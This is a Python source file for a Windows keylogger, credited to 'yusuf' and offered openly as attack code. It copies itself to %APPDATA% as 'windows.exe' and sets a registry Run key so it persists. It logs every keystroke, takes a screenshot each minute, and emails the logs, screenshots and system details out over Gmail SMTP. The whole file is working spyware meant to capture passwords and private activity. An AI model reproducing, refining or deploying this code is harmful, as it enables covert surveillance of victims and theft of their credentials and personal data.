#############################
# @author: yusuf            #
# release date: 29.04.2020  #
#############################


# Import necessary libraries
# ---------------------------

import os
import sys
import time
import shutil
import smtplib
import platform
import threading
import datetime
import pyautogui
import subprocess
import pynput.keyboard
from dotenv import load_dotenv
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


today = datetime.date.today()
system_info = platform.uname()
user_home_path = os.environ['HOMEPATH']
# We collect some information about the file system of the computer we are attacking
# Send a test message with date that we know the program has started
log = "Keylogger has been started on " + str(today) + "." + " **** USER HOME PATH: " + user_home_path + " **** " + "A SUMMARY OF SYSTEM INFORMATION: " + str(system_info)
i = 0

# part to set #

load_dotenv()
waiting_time_to_send_mail = 60      # You can change the time for waiting. 60 seconds is the default value.
email = os.getenv("EMAIL")          # Enter here your email
password = os.getenv("PASSWORD")    # Enter here your password
subject_text = "Log Number "        # Enter here the subject of email
subject = subject_text + str(i)  


def copy_exefile_to_another_location(file_location):
    shutil.copyfile(sys.executable, file_location)


def add_to_registry():
    new_file = os.environ["appdata"] + "\\windows.exe"

    if not os.path.exists(new_file):
        copy_exefile_to_another_location(new_file)
        
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windows /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)
            

def callback_function(key):
    global log
    try:

        log = log + key.char.encode("utf-8")
        # log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.backspace:
            log = log + "<--"
        else:
            log = log + str(key)

    print(log)


def send_email(email, password, message, img_file_name):
    img_data = open(img_file_name, 'rb').read()
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = email
    msg['To'] = email

    text = MIMEText(message)
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename(img_file_name))
    msg.attach(image)

    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.ehlo()
    email_server.starttls()
    email_server.ehlo()
    email_server.login(email, password)
    email_server.sendmail(email, email, msg.as_string())
    email_server.quit()


def take_screenshot():
    global i
    screenshot = pyautogui.screenshot()
    screenshot.save("minute" + str(i) + ".png")
    i = i + 1


# thread - threading

def thread_function():
    global log
    global i
    global subject
    take_screenshot()
    subject = subject_text + str(i)   
    send_email(email, password, log, "minute" + str(i-1) + ".png")  # enter here your gmail username and password
    log = ""
    timer_object = threading.Timer(waiting_time_to_send_mail, thread_function)  # send the logs every 60 seconds
    timer_object.start()


add_to_registry()
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    thread_function()
    keylogger_listener.join()
